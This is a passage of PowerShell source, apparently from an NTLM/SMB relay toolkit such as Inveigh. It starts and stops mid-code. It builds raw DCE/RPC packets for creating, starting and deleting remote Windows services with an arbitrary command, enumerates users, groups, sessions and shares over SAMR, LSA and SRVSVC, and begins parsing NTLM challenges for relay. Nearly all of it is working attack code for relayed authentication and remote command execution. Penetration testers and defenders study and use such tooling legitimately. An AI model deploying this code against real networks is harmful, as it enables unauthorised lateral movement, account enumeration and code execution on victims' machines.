$RPCBind.Add(\"TransferSyntaxVer2\",[Byte[]](0x01,0x00,0x00,0x00))\n        }\n        elseif($NumCtxItems[0] -eq 3)\n        {\n            $RPCBind.Add(\"ContextID2\",[Byte[]](0x01,0x00))\n            $RPCBind.Add(\"NumTransItems2\",[Byte[]](0x01))\n            $RPCBind.Add(\"Unknown3\",[Byte[]](0x00))\n            $RPCBind.Add(\"Interface2\",$UUID)\n            $RPCBind.Add(\"InterfaceVer2\",$UUIDVersion)\n            $RPCBind.Add(\"InterfaceVerMinor2\",[Byte[]](0x00,0x00))\n            $RPCBind.Add(\"TransferSyntax2\",[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))\n            $RPCBind.Add(\"TransferSyntaxVer2\",[Byte[]](0x01,0x00,0x00,0x00))\n            $RPCBind.Add(\"ContextID3\",[Byte[]](0x02,0x00))\n            $RPCBind.Add(\"NumTransItems3\",[Byte[]](0x01))\n            $RPCBind.Add(\"Unknown4\",[Byte[]](0x00))\n            $RPCBind.Add(\"Interface3\",$UUID)\n            $RPCBind.Add(\"InterfaceVer3\",$UUIDVersion)\n            $RPCBind.Add(\"InterfaceVerMinor3\",[Byte[]](0x00,0x00))\n            $RPCBind.Add(\"TransferSyntax3\",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))\n            $RPCBind.Add(\"TransferSyntaxVer3\",[Byte[]](0x01,0x00,0x00,0x00))\n        }\n    \n        if($call_ID -eq 3)\n        {\n            $RPCBind.Add(\"AuthType\",[Byte[]](0x0a))\n            $RPCBind.Add(\"AuthLevel\",[Byte[]](0x02))\n            $RPCBind.Add(\"AuthPadLength\",[Byte[]](0x00))\n            $RPCBind.Add(\"AuthReserved\",[Byte[]](0x00))\n            $RPCBind.Add(\"ContextID3\",[Byte[]](0x00,0x00,0x00,0x00))\n            $RPCBind.Add(\"Identifier\",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))\n            $RPCBind.Add(\"MessageType\",[Byte[]](0x01,0x00,0x00,0x00))\n            $RPCBind.Add(\"NegotiateFlags\",[Byte[]](0x97,0x82,0x08,0xe2))\n            $RPCBind.Add(\"CallingWorkstationDomain\",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))\n            $RPCBind.Add(\"CallingWorkstationName\",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))\n            $RPCBind.Add(\"OSVersion\",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))\n        }\n    \n        return $RPCBind\n    }\n    \n    function New-PacketRPCRequest\n    {\n        param([Byte[]]$Flags,[Int]$ServiceLength,[Int]$AuthLength,[Int]$AuthPadding,[Byte[]]$CallID,[Byte[]]$ContextID,[Byte[]]$Opnum,[Byte[]]$Data)\n    \n        if($AuthLength -gt 0)\n        {\n            $full_auth_length = $AuthLength + $AuthPadding + 8\n        }\n    \n        [Byte[]]$write_length = [System.BitConverter]::GetBytes($ServiceLength + 24 + $full_auth_length + $Data.Length)\n        [Byte[]]$frag_length = $write_length[0,1]\n        [Byte[]]$alloc_hint = [System.BitConverter]::GetBytes($ServiceLength + $Data.Length)\n        [Byte[]]$auth_length = ([System.BitConverter]::GetBytes($AuthLength))[0,1]\n    \n        $RPCRequest = New-Object System.Collections.Specialized.OrderedDictionary\n        $RPCRequest.Add(\"Version\",[Byte[]](0x05))\n        $RPCRequest.Add(\"VersionMinor\",[Byte[]](0x00))\n        $RPCRequest.Add(\"PacketType\",[Byte[]](0x00))\n        $RPCRequest.Add(\"PacketFlags\",$Flags)\n        $RPCRequest.Add(\"DataRepresentation\",[Byte[]](0x10,0x00,0x00,0x00))\n        $RPCRequest.Add(\"FragLength\",$frag_length)\n        $RPCRequest.Add(\"AuthLength\",$auth_length)\n        $RPCRequest.Add(\"CallID\",$CallID)\n        $RPCRequest.Add(\"AllocHint\",$alloc_hint)\n        $RPCRequest.Add(\"ContextID\",$ContextID)\n        $RPCRequest.Add(\"Opnum\",$Opnum)\n    \n        if($data.Length)\n        {\n            $RPCRequest.Add(\"Data\",$Data)\n        }\n    \n        return $RPCRequest\n    }\n\n    #SCM\n\n    function New-PacketSCMOpenSCManagerW\n    {\n        param ([Byte[]]$packet_service,[Byte[]]$packet_service_length)\n    \n        $packet_referent_ID1 = [String](1..2 | ForEach-Object {\"{0:X2}\" -f (Get-Random -Minimum 1 -Maximum 255)})\n        $packet_referent_ID1 = $packet_referent_ID1.Split(\" \") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n        $packet_referent_ID1 += 0x00,0x00\n        $packet_referent_ID2 = [String](1..2 | ForEach-Object {\"{0:X2}\" -f (Get-Random -Minimum 1 -Maximum 255)})\n        $packet_referent_ID2 = $packet_referent_ID2.Split(\" \") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n        $packet_referent_ID2 += 0x00,0x00\n    \n        $packet_SCMOpenSCManagerW = New-Object System.Collections.Specialized.OrderedDictionary\n        $packet_SCMOpenSCManagerW.Add(\"MachineName_ReferentID\",$packet_referent_ID1)\n        $packet_SCMOpenSCManagerW.Add(\"MachineName_MaxCount\",$packet_service_length)\n        $packet_SCMOpenSCManagerW.Add(\"MachineName_Offset\",[Byte[]](0x00,0x00,0x00,0x00))\n        $packet_SCMOpenSCManagerW.Add(\"MachineName_ActualCount\",$packet_service_length)\n        $packet_SCMOpenSCManagerW.Add(\"MachineName\",$packet_service)\n        $packet_SCMOpenSCManagerW.Add(\"Database_ReferentID\",$packet_referent_ID2)\n        $packet_SCMOpenSCManagerW.Add(\"Database_NameMaxCount\",[Byte[]](0x0f,0x00,0x00,0x00))\n        $packet_SCMOpenSCManagerW.Add(\"Database_NameOffset\",[Byte[]](0x00,0x00,0x00,0x00))\n        $packet_SCMOpenSCManagerW.Add(\"Database_NameActualCount\",[Byte[]](0x0f,0x00,0x00,0x00))\n        $packet_SCMOpenSCManagerW.Add(\"Database\",[Byte[]](0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x73,0x00,0x41,0x00,0x63,0x00,0x74,0x00,0x69,0x00,0x76,0x00,0x65,0x00,0x00,0x00))\n        $packet_SCMOpenSCManagerW.Add(\"Unknown\",[Byte[]](0xbf,0xbf))\n        $packet_SCMOpenSCManagerW.Add(\"AccessMask\",[Byte[]](0x3f,0x00,0x00,0x00))\n        \n        return $packet_SCMOpenSCManagerW\n    }\n    \n    function New-PacketSCMCreateServiceW\n    {\n        param([Byte[]]$ContextHandle,[Byte[]]$Service,[Byte[]]$ServiceLength,[Byte[]]$Command,[Byte[]]$CommandLength)\n                    \n        $referent_ID = [String](1..2 | ForEach-Object {\"{0:X2}\" -f (Get-Random -Minimum 1 -Maximum 255)})\n        $referent_ID = $referent_ID.Split(\" \") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n        $referent_ID += 0x00,0x00\n    \n        $SCMCreateServiceW = New-Object System.Collections.Specialized.OrderedDictionary\n        $SCMCreateServiceW.Add(\"ContextHandle\",$ContextHandle)\n        $SCMCreateServiceW.Add(\"ServiceName_MaxCount\",$ServiceLength)\n        $SCMCreateServiceW.Add(\"ServiceName_Offset\",[Byte[]](0x00,0x00,0x00,0x00))\n        $SCMCreateServiceW.Add(\"ServiceName_ActualCount\",$ServiceLength)\n        $SCMCreateServiceW.Add(\"ServiceName\",$Service)\n        $SCMCreateServiceW.Add(\"DisplayName_ReferentID\",$referent_ID)\n        $SCMCreateServiceW.Add(\"DisplayName_MaxCount\",$ServiceLength)\n        $SCMCreateServiceW.Add(\"DisplayName_Offset\",[Byte[]](0x00,0x00,0x00,0x00))\n        $SCMCreateServiceW.Add(\"DisplayName_ActualCount\",$ServiceLength)\n        $SCMCreateServiceW.Add(\"DisplayName\",$Service)\n        $SCMCreateServiceW.Add(\"AccessMask\",[Byte[]](0xff,0x01,0x0f,0x00))\n        $SCMCreateServiceW.Add(\"ServiceType\",[Byte[]](0x10,0x00,0x00,0x00))\n        $SCMCreateServiceW.Add(\"ServiceStartType\",[Byte[]](0x03,0x00,0x00,0x00))\n        $SCMCreateServiceW.Add(\"ServiceErrorControl\",[Byte[]](0x00,0x00,0x00,0x00))\n        $SCMCreateServiceW.Add(\"BinaryPathName_MaxCount\",$CommandLength)\n        $SCMCreateServiceW.Add(\"BinaryPathName_Offset\",[Byte[]](0x00,0x00,0x00,0x00))\n        $SCMCreateServiceW.Add(\"BinaryPathName_ActualCount\",$CommandLength)\n        $SCMCreateServiceW.Add(\"BinaryPathName\",$Command)\n        $SCMCreateServiceW.Add(\"NULLPointer\",[Byte[]](0x00,0x00,0x00,0x00))\n        $SCMCreateServiceW.Add(\"TagID\",[Byte[]](0x00,0x00,0x00,0x00))\n        $SCMCreateServiceW.Add(\"NULLPointer2\",[Byte[]](0x00,0x00,0x00,0x00))\n        $SCMCreateServiceW.Add(\"DependSize\",[Byte[]](0x00,0x00,0x00,0x00))\n        $SCMCreateServiceW.Add(\"NULLPointer3\",[Byte[]](0x00,0x00,0x00,0x00))\n        $SCMCreateServiceW.Add(\"NULLPointer4\",[Byte[]](0x00,0x00,0x00,0x00))\n        $SCMCreateServiceW.Add(\"PasswordSize\",[Byte[]](0x00,0x00,0x00,0x00))\n    \n        return $SCMCreateServiceW\n    }\n    \n    function New-PacketSCMStartServiceW\n    {\n        param([Byte[]]$ContextHandle)\n    \n        $SCMStartServiceW = New-Object System.Collections.Specialized.OrderedDictionary\n        $SCMStartServiceW.Add(\"ContextHandle\",$ContextHandle)\n        $SCMStartServiceW.Add(\"Unknown\",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))\n    \n        return $SCMStartServiceW\n    }\n    \n    function New-PacketSCMDeleteServiceW\n    {\n        param([Byte[]]$ContextHandle)\n    \n        $SCMDeleteServiceW = New-Object System.Collections.Specialized.OrderedDictionary\n        $SCMDeleteServiceW.Add(\"ContextHandle\",$ContextHandle)\n    \n        return $SCMDeleteServiceW\n    }\n    \n    function New-PacketSCMCloseServiceHandle\n    {\n        param([Byte[]]$ContextHandle)\n    \n        $SCM_CloseServiceW = New-Object System.Collections.Specialized.OrderedDictionary\n        $SCM_CloseServiceW.Add(\"ContextHandle\",$ContextHandle)\n    \n        return $SCM_CloseServiceW\n    }\n\n    # LSA\nfunction New-PacketLSAOpenPolicy\n{\n    $LSAOpenPolicy = New-Object System.Collections.Specialized.OrderedDictionary\n    $LSAOpenPolicy.Add(\"PointerToSystemName_ReferentID\",[Byte[]](0x00,0x00,0x02,0x00))\n    $LSAOpenPolicy.Add(\"PointerToSystemName_System\",[Byte[]](0x5c,0x00))\n    $LSAOpenPolicy.Add(\"PointerToSystemName_Unknown\",[Byte[]](0x00,0x00))\n    $LSAOpenPolicy.Add(\"PointerToAttr_Attr_Len\",[Byte[]](0x18,0x00,0x00,0x00))\n    $LSAOpenPolicy.Add(\"PointerToAttr_Attr_NullPointer\",[Byte[]](0x00,0x00,0x00,0x00))\n    $LSAOpenPolicy.Add(\"PointerToAttr_Attr_NullPointer2\",[Byte[]](0x00,0x00,0x00,0x00))\n    $LSAOpenPolicy.Add(\"PointerToAttr_Attr_Attributes\",[Byte[]](0x00,0x00,0x00,0x00))\n    $LSAOpenPolicy.Add(\"PointerToAttr_Attr_NullPointer3\",[Byte[]](0x00,0x00,0x00,0x00))\n    $LSAOpenPolicy.Add(\"PointerToAttr_Attr_PointerToSecQos_ReferentID\",[Byte[]](0x04,0x00,0x02,0x00))\n    $LSAOpenPolicy.Add(\"PointerToAttr_Attr_PointerToSecQos_Qos_Len\",[Byte[]](0x0c,0x00,0x00,0x00))\n    $LSAOpenPolicy.Add(\"PointerToAttr_Attr_PointerToSecQos_ImpersonationLevel\",[Byte[]](0x02,0x00))\n    $LSAOpenPolicy.Add(\"PointerToAttr_Attr_PointerToSecQos_ContextMode\",[Byte[]](0x01))\n    $LSAOpenPolicy.Add(\"PointerToAttr_Attr_PointerToSecQos_EffectiveOnly\",[Byte[]](0x00))\n    $LSAOpenPolicy.Add(\"AccessMask\",[Byte[]](0x00,0x00,0x00,0x02))\n\n    return $LSAOpenPolicy\n}\n\nfunction New-PacketLSAQueryInfoPolicy\n{\n    param([Byte[]]$Handle)\n\n    $LSAQueryInfoPolicy = New-Object System.Collections.Specialized.OrderedDictionary\n    $LSAQueryInfoPolicy.Add(\"PointerToHandle\",$Handle)\n    $LSAQueryInfoPolicy.Add(\"Level\",[Byte[]](0x05,0x00))\n\n    return $LSAQueryInfoPolicy\n}\n\nfunction New-PacketLSAClose\n{\n    param([Byte[]]$Handle)\n\n    $LSAClose = New-Object System.Collections.Specialized.OrderedDictionary\n    $LSAClose.Add(\"PointerToHandle\",$Handle)\n\n    return $LSAClose\n}\n\nfunction New-PacketLSALookupSids\n{\n    param([Byte[]]$Handle,[Byte[]]$SIDArray)\n\n    $LSALookupSids = New-Object System.Collections.Specialized.OrderedDictionary\n    $LSALookupSids.Add(\"PointerToHandle\",$Handle)\n    $LSALookupSids.Add(\"PointerToSIDs_SIDArray\",$SIDArray)\n    $LSALookupSids.Add(\"PointerToNames_count\",[Byte[]](0x00,0x00,0x00,0x00))\n    $LSALookupSids.Add(\"PointerToNames_NULL_pointer\",[Byte[]](0x00,0x00,0x00,0x00))\n    $LSALookupSids.Add(\"PointerToNames_level\",[Byte[]](0x01,0x00))\n    $LSALookupSids.Add(\"PointerToCount\",[Byte[]](0x00,0x00))\n    $LSALookupSids.Add(\"PointerToCount_count\",[Byte[]](0x00,0x00,0x00,0x00))\n\n    return $LSALookupSids\n}\n\n# SAMR\n\nfunction New-PacketSAMRConnect2\n{\n    param([String]$SystemName)\n\n    [Byte[]]$system_name = [System.Text.Encoding]::Unicode.GetBytes($SystemName)\n    [Byte[]]$max_count = [System.BitConverter]::GetBytes($SystemName.Length + 1)\n\n    if($SystemName.Length % 2)\n    {\n        $system_name += 0x00,0x00\n    }\n    else\n    {\n        $system_name += 0x00,0x00,0x00,0x00\n    }\n\n    $SAMRConnect2 = New-Object System.Collections.Specialized.OrderedDictionary\n    $SAMRConnect2.Add(\"PointerToSystemName_ReferentID\",[Byte[]](0x00,0x00,0x02,0x00))\n    $SAMRConnect2.Add(\"PointerToSystemName_MaxCount\",$max_count)\n    $SAMRConnect2.Add(\"PointerToSystemName_Offset\",[Byte[]](0x00,0x00,0x00,0x00))\n    $SAMRConnect2.Add(\"PointerToSystemName_ActualCount\",$max_count)\n    $SAMRConnect2.Add(\"PointerToSystemName_SystemName\",$system_name)\n    $SAMRConnect2.Add(\"AccessMask\",[Byte[]](0x00,0x00,0x00,0x02))\n\n    return $SAMRConnect2\n}\n\nfunction New-PacketSAMRConnect5\n{\n    param([String]$SystemName)\n\n    $SystemName = \"\\\\\" + $SystemName\n    [Byte[]]$system_name = [System.Text.Encoding]::Unicode.GetBytes($SystemName)\n    [Byte[]]$max_count = [System.BitConverter]::GetBytes($SystemName.Length + 1)\n\n    if($SystemName.Length % 2)\n    {\n        $system_name += 0x00,0x00\n    }\n    else\n    {\n        $system_name += 0x00,0x00,0x00,0x00\n    }\n\n    $SAMRConnect5 = New-Object System.Collections.Specialized.OrderedDictionary\n    $SAMRConnect5.Add(\"PointerToSystemName_ReferentID\",[Byte[]](0x00,0x00,0x02,0x00))\n    $SAMRConnect5.Add(\"PointerToSystemName_MaxCount\",$max_count)\n    $SAMRConnect5.Add(\"PointerToSystemName_Offset\",[Byte[]](0x00,0x00,0x00,0x00))\n    $SAMRConnect5.Add(\"PointerToSystemName_ActualCount\",$max_count)\n    $SAMRConnect5.Add(\"PointerToSystemName_SystemName\",$system_name)\n    $SAMRConnect5.Add(\"AccessMask\",[Byte[]](0x00,0x00,0x00,0x02))\n    $SAMRConnect5.Add(\"LevelIn\",[Byte[]](0x01,0x00,0x00,0x00))\n    $SAMRConnect5.Add(\"PointerToInfoIn_SAMRConnectInfo_InfoIn\",[Byte[]](0x01,0x00,0x00,0x00))\n    $SAMRConnect5.Add(\"PointerToInfoIn_SAMRConnectInfo_InfoIn1_ClientVersion\",[Byte[]](0x02,0x00,0x00,0x00))\n    $SAMRConnect5.Add(\"PointerToInfoIn_SAMRConnectInfo_InfoIn1_Unknown\",[Byte[]](0x00,0x00,0x00,0x00))\n\n    return $SAMRConnect5\n}\n\nfunction New-PacketSAMRGetMembersInAlias\n{\n    param([Byte[]]$Handle)\n\n    $SAMRGetMembersInAlias = New-Object System.Collections.Specialized.OrderedDictionary\n    $SAMRGetMembersInAlias.Add(\"PointerToConnectHandle\",$Handle)\n\n    return $SAMRGetMembersInAlias\n}\n\nfunction New-PacketSAMRClose\n{\n    param([Byte[]]$Handle)\n\n    $SAMRClose = New-Object System.Collections.Specialized.OrderedDictionary\n    $SAMRClose.Add(\"PointerToConnectHandle\",$Handle)\n\n    return $SAMRClose\n}\n\nfunction New-PacketSAMROpenAlias\n{\n    param([Byte[]]$Handle,[Byte[]]$RID)\n\n    $SAMROpenAlias = New-Object System.Collections.Specialized.OrderedDictionary\n    $SAMROpenAlias.Add(\"PointerToConnectHandle\",$Handle)\n    $SAMROpenAlias.Add(\"AccessMask\",[Byte[]](0x00,0x00,0x00,0x02))\n    $SAMROpenAlias.Add(\"RID\",$RID)\n\n    return $SAMROpenAlias\n}\n\nfunction New-PacketSAMROpenGroup\n{\n    param([Byte[]]$Handle,[Byte[]]$RID)\n\n    $SAMROpenGroup = New-Object System.Collections.Specialized.OrderedDictionary\n    $SAMROpenGroup.Add(\"PointerToConnectHandle\",$Handle)\n    $SAMROpenGroup.Add(\"AccessMask\",[Byte[]](0x00,0x00,0x00,0x02))\n    $SAMROpenGroup.Add(\"RID\",$RID)\n\n    return $SAMROpenGroup\n}\n\nfunction New-PacketSAMRQueryGroupMember\n{\n    param([Byte[]]$Handle)\n\n    $SAMRQueryGroupMember = New-Object System.Collections.Specialized.OrderedDictionary\n    $SAMRQueryGroupMember.Add(\"PointerToGroupHandle\",$Handle)\n\n    return $SAMRQueryGroupMember\n}\n\nfunction New-PacketSAMROpenDomain\n{\n    param([Byte[]]$Handle,[Byte[]]$SIDCount,[Byte[]]$SID)\n\n    $SAMROpenDomain = New-Object System.Collections.Specialized.OrderedDictionary\n    $SAMROpenDomain.Add(\"PointerToConnectHandle\",$Handle)\n    $SAMROpenDomain.Add(\"AccessMask\",[Byte[]](0x00,0x00,0x00,0x02))\n    $SAMROpenDomain.Add(\"PointerToSid_Count\",$SIDCount)\n    $SAMROpenDomain.Add(\"PointerToSid_Sid\",$SID)\n\n    return $SAMROpenDomain\n}\n\nfunction New-PacketSAMREnumDomainUsers\n{\n    param([Byte[]]$Handle)\n\n    $SAMREnumDomainUsers = New-Object System.Collections.Specialized.OrderedDictionary\n    $SAMREnumDomainUsers.Add(\"PointerToDomainHandle\",$Handle)\n    $SAMREnumDomainUsers.Add(\"PointerToResumeHandle\",[Byte[]](0x00,0x00,0x00,0x00))\n    $SAMREnumDomainUsers.Add(\"AcctFlags\",[Byte[]](0x10,0x00,0x00,0x00))\n    $SAMREnumDomainUsers.Add(\"MaxSize\",[Byte[]](0xff,0xff,0x00,0x00))\n\n    return $SAMREnumDomainUsers\n}\n\nfunction New-PacketSAMRLookupNames\n{\n    param([Byte[]]$Handle,[String]$Names)\n\n    [Byte[]]$names_bytes = [System.Text.Encoding]::Unicode.GetBytes($Names)\n    [Byte[]]$name_len = ([System.BitConverter]::GetBytes($names_bytes.Length))[0,1]\n    [Byte[]]$max_count = [System.BitConverter]::GetBytes($Names.Length)\n\n    $SAMRLookupNames = New-Object System.Collections.Specialized.OrderedDictionary\n    $SAMRLookupNames.Add(\"PointerToDomainHandle\",$Handle)\n    $SAMRLookupNames.Add(\"NumNames\",[Byte[]](0x01,0x00,0x00,0x00))\n    $SAMRLookupNames.Add(\"PointerToNames_MaxCount\",[Byte[]](0xe8,0x03,0x00,0x00))\n    $SAMRLookupNames.Add(\"PointerToNames_Offset\",[Byte[]](0x00,0x00,0x00,0x00))\n    $SAMRLookupNames.Add(\"PointerToNames_ActualCount\",[Byte[]](0x01,0x00,0x00,0x00))\n    $SAMRLookupNames.Add(\"PointerToNames_Names_NameLen\",$name_len)\n    $SAMRLookupNames.Add(\"PointerToNames_Names_NameSize\",$name_len)\n    $SAMRLookupNames.Add(\"PointerToNames_Names_Name_ReferentID\",[Byte[]](0x00,0x00,0x02,0x00))\n    $SAMRLookupNames.Add(\"PointerToNames_Names_Name_MaxCount\",$max_count)\n    $SAMRLookupNames.Add(\"PointerToNames_Names_Name_Offset\",[Byte[]](0x00,0x00,0x00,0x00))\n    $SAMRLookupNames.Add(\"PointerToNames_Names_Name_ActualCount\",$max_count)\n    $SAMRLookupNames.Add(\"PointerToNames_Names_Name_Names\",$names_bytes)\n\n    return $SAMRLookupNames\n}\n\nfunction New-PacketSAMRLookupRids\n{\n    param([Byte[]]$Handle,[Byte[]]$RIDCount,[Byte[]]$Rids)\n\n    $SAMRLookupRIDS = New-Object System.Collections.Specialized.OrderedDictionary\n    $SAMRLookupRIDS.Add(\"PointerToDomainHandle\",$Handle)\n    $SAMRLookupRIDS.Add(\"NumRids\",$RIDCount)\n    $SAMRLookupRIDS.Add(\"Unknown\",[Byte[]](0xe8,0x03,0x00,0x00,0x00,0x00,0x00,0x00))\n    $SAMRLookupRIDS.Add(\"NumRids2\",$RIDCount)\n    $SAMRLookupRIDS.Add(\"Rids\",$Rids)\n\n    return $SAMRLookupRIDS\n}\n\n# SRVSVC\nfunction New-PacketSRVSVCNetSessEnum\n{\n    param([String]$ServerUNC)\n\n    [Byte[]]$server_UNC = [System.Text.Encoding]::Unicode.GetBytes($ServerUNC)\n    [Byte[]]$max_count = [System.BitConverter]::GetBytes($ServerUNC.Length + 1)\n       \n    if($ServerUNC.Length % 2)\n    {\n        $server_UNC += 0x00,0x00\n    }\n    else\n    {\n        $server_UNC += 0x00,0x00,0x00,0x00\n    }\n\n    $SRVSVCNetSessEnum = New-Object System.Collections.Specialized.OrderedDictionary\n    $SRVSVCNetSessEnum.Add(\"PointerToServerUNC_ReferentID\",[Byte[]](0x00,0x00,0x02,0x00))\n    $SRVSVCNetSessEnum.Add(\"PointerToServerUNC_MaxCount\",$max_count)\n    $SRVSVCNetSessEnum.Add(\"PointerToServerUNC_Offset\",[Byte[]](0x00,0x00,0x00,0x00))\n    $SRVSVCNetSessEnum.Add(\"PointerToServerUNC_ActualCount\",$max_count)\n    $SRVSVCNetSessEnum.Add(\"PointerToServerUNC_ServerUNC\",$server_UNC)\n    $SRVSVCNetSessEnum.Add(\"PointerToClient_ReferentID\",[Byte[]](0x04,0x00,0x02,0x00))\n    $SRVSVCNetSessEnum.Add(\"PointerToClient_MaxCount\",[Byte[]](0x01,0x00,0x00,0x00))\n    $SRVSVCNetSessEnum.Add(\"PointerToClient_Offset\",[Byte[]](0x00,0x00,0x00,0x00))\n    $SRVSVCNetSessEnum.Add(\"PointerToClient_ActualCount\",[Byte[]](0x01,0x00,0x00,0x00))\n    $SRVSVCNetSessEnum.Add(\"PointerToClient_Client\",[Byte[]](0x00,0x00))\n    $SRVSVCNetSessEnum.Add(\"PointerToUser\",[Byte[]](0x00,0x00))\n    $SRVSVCNetSessEnum.Add(\"PointerToUser_ReferentID\",[Byte[]](0x08,0x00,0x02,0x00))\n    $SRVSVCNetSessEnum.Add(\"PointerToUser_MaxCount\",[Byte[]](0x01,0x00,0x00,0x00))\n    $SRVSVCNetSessEnum.Add(\"PointerToUser_Offset\",[Byte[]](0x00,0x00,0x00,0x00))\n    $SRVSVCNetSessEnum.Add(\"PointerToUser_ActualCount\",[Byte[]](0x01,0x00,0x00,0x00))\n    $SRVSVCNetSessEnum.Add(\"PointerToUser_User\",[Byte[]](0x00,0x00))\n    $SRVSVCNetSessEnum.Add(\"PointerToLevel\",[Byte[]](0x00,0x00))\n    $SRVSVCNetSessEnum.Add(\"PointerToLevel_Level\",[Byte[]](0x0a,0x00,0x00,0x00))\n    $SRVSVCNetSessEnum.Add(\"PointerToCtr_NetSessCtr_Ctr\",[Byte[]](0x0a,0x00,0x00,0x00))\n    $SRVSVCNetSessEnum.Add(\"PointerToCtr_NetSessCtr_PointerToCtr10_ReferentID\",[Byte[]](0x0c,0x00,0x02,0x00))\n    $SRVSVCNetSessEnum.Add(\"PointerToCtr_NetSessCtr_PointerToCtr10_Ctr10_Count\",[Byte[]](0x00,0x00,0x00,0x00))\n    $SRVSVCNetSessEnum.Add(\"PointerToCtr_NetSessCtr_PointerToCtr10_Ctr10_NullPointer\",[Byte[]](0x00,0x00,0x00,0x00))\n    $SRVSVCNetSessEnum.Add(\"MaxBuffer\",[Byte[]](0xff,0xff,0xff,0xff))\n    $SRVSVCNetSessEnum.Add(\"PointerToResumeHandle_ReferentID\",[Byte[]](0x10,0x00,0x02,0x00))\n    $SRVSVCNetSessEnum.Add(\"PointerToResumeHandle_ResumeHandle\",[Byte[]](0x00,0x00,0x00,0x00))\n\n    return $SRVSVCNetSessEnum\n}\n\nfunction New-PacketSRVSVCNetShareEnumAll\n{\n    param([String]$ServerUNC)\n\n    $ServerUNC = \"\\\\\" + $ServerUNC\n    [Byte[]]$server_UNC = [System.Text.Encoding]::Unicode.GetBytes($ServerUNC)\n    [Byte[]]$max_count = [System.BitConverter]::GetBytes($ServerUNC.Length + 1)\n\n    if($ServerUNC.Length % 2)\n    {\n        $server_UNC += 0x00,0x00\n    }\n    else\n    {\n        $server_UNC += 0x00,0x00,0x00,0x00\n    }\n\n    $SRVSVCNetShareEnum = New-Object System.Collections.Specialized.OrderedDictionary\n    $SRVSVCNetShareEnum.Add(\"PointerToServerUNC_ReferentID\",[Byte[]](0x00,0x00,0x02,0x00))\n    $SRVSVCNetShareEnum.Add(\"PointerToServerUNC_MaxCount\",$max_count)\n    $SRVSVCNetShareEnum.Add(\"PointerToServerUNC_Offset\",[Byte[]](0x00,0x00,0x00,0x00))\n    $SRVSVCNetShareEnum.Add(\"PointerToServerUNC_ActualCount\",$max_count)\n    $SRVSVCNetShareEnum.Add(\"PointerToServerUNC_ServerUNC\",$server_UNC)\n    $SRVSVCNetShareEnum.Add(\"PointerToLevel_Level\",[Byte[]](0x01,0x00,0x00,0x00))\n    $SRVSVCNetShareEnum.Add(\"PointerToCtr_NetShareCtr_Ctr\",[Byte[]](0x01,0x00,0x00,0x00))\n    $SRVSVCNetShareEnum.Add(\"PointerToCtr_NetShareCtr_Pointer_ReferentID\",[Byte[]](0x04,0x00,0x02,0x00))\n    $SRVSVCNetShareEnum.Add(\"PointerToCtr_NetShareCtr_Pointer_Ctr1_Count\",[Byte[]](0x00,0x00,0x00,0x00))\n    $SRVSVCNetShareEnum.Add(\"PointerToCtr_NetShareCtr_Pointer_NullPointer\",[Byte[]](0x00,0x00,0x00,0x00))\n    $SRVSVCNetShareEnum.Add(\"MaxBuffer\",[Byte[]](0xff,0xff,0xff,0xff))\n    $SRVSVCNetShareEnum.Add(\"ReferentID\",[Byte[]](0x08,0x00,0x02,0x00))\n    $SRVSVCNetShareEnum.Add(\"ResumeHandle\",[Byte[]](0x00,0x00,0x00,0x00))\n\n    return $SRVSVCNetShareEnum\n}\n    \n}\n\n# Relay Functions ScriptBlock\n$SMB_relay_functions_scriptblock =\n{\n\n    function Get-SMBNTLMChallenge\n    {\n        param ([Byte[]]$Payload)\n\n        $payload_converted = [System.BitConverter]::ToString($Payload)\n        $payload_converted = $payload_converted -replace \"-\",\"\"\n        $NTLM_index = $payload_converted.IndexOf(\"4E544C4D53535000\")\n\n        if($payload_converted.SubString(($NTLM_index + 16),8) -eq \"02000000\")\n        {\n            $NTLM_challenge = $payload_converted.SubString(($NTLM_index + 48),16)\n        }\n\n        $target_name_length = Get-UInt16DataLength (($NTLM_index + 24) / 2) $Payload\n        $negotiate_flags = [System.Convert]::ToInt16(($payload_converted.SubString(($NTLM_index + 44),2)),16)\n        $negotiate_flags = [Convert]::ToString($negotiate_flags,2)\n        $target_info_flag = $negotiate_flags.SubString(0,1)\n\n        if($target_info_flag -eq 1)\n        {\n            $target_info_index = ($NTLM_index + 80) / 2\n            $target_info_index = $target_info_index + $target_name_length + 16\n            $target_info_item_type = $Payload[$target_info_index]\n            $i = 0\n\n            while($target_info_item_type -ne 0 -and $i -lt 10)\n            {\n                $target_info_item_length = Get-UInt16DataLength ($target_info_index + 2) $Payload\n\n                switch($target_info_item_type) \n                {\n\n                    2\n                    {\n                        $netBIOS_domain_name = Convert-DataToString ($target_info_index + 4) $target_info_item_length $Payload\n                    }\n\n                    3\n                    {\n                        $DNS_computer_name = Convert-DataToString ($target_info_index + 4) $target_info_item_length $Payload\n                    }\n\n                    4\n                    {\n                        $DNS_domain_name = Convert-DataToString ($target_info_index + 4) $target_info_item_length $Payload\n                    }\n\n                }\n\n                $target_info_index = $target_info_index + $target_info_item_length + 4\n                $target_info_item_type = $Payload[$target_info_index]\n                $i++\n            }\n\n            if($netBIOS_domain_name -and $DNS_domain_name -and !$inveigh.domain_mapping_table.$netBIOS_domain_name -and $netBIOS_domain_name -ne $DNS_domain_name)\n            {\n                $inveigh.domain_mapping_table.Add($netBIOS_domain_name,$DNS_domain_name)\n                $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] Domain mapping added for $netBIOS_domain_name to $DNS_domain_name\") > $null\n            }\n\n            for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)\n            {\n\n                if($inveigh.enumerate[$i].IP -eq $target -and !$inveigh.enumerate[$i].Hostname)\n                {\n                    $inveigh.enumerate[$i].Hostname = $DNS_computer_name\n                    